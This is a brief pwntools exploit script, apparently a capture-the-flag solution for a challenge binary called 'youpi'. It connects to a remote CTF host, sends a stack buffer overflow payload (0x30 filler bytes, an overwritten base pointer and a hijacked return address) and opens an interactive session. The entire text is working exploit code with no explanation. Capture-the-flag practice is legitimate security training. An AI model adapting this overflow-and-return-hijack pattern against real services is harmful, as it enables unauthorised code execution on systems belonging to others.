from pwn import *


#sh = process("./public/youpi")
sh = remote("pwn.battlectf.online",1005)

print(sh.recv().decode())
#gdb.attach(sh)
sh.sendline(
	b"A"*(0x30)
	+ p64(0x00404030)
	+ p64(0x401176+18)
	)

sh.interactive()
